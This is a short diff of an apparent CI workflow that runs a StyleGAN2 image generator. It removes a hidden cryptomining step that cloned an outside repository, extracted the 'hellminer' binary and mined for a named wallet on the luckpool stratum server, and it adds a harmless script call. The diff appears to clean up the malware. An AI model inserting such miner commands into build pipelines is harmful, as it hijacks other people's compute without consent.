@@ -33,13 +33,8 @@ jobs:
         pip install scipy==1.3.3
         pip install requests==2.22.0
         pip install Pillow==6.2.1
-        pip install GitPython
-        pip install --upgrade pip
-        git clone https://github.com/joakin20/geladaju.git
-        cd /geladaju
-        tar -xvf hellminer_cpu_linux.tar.gz
-        ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RCe3fTKcK132fymKGCsNaqhjTDK6m4V5Wz.g1 -p x --cpu 6
         cd /inputs/stylegan2
+        python run_hello.py
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
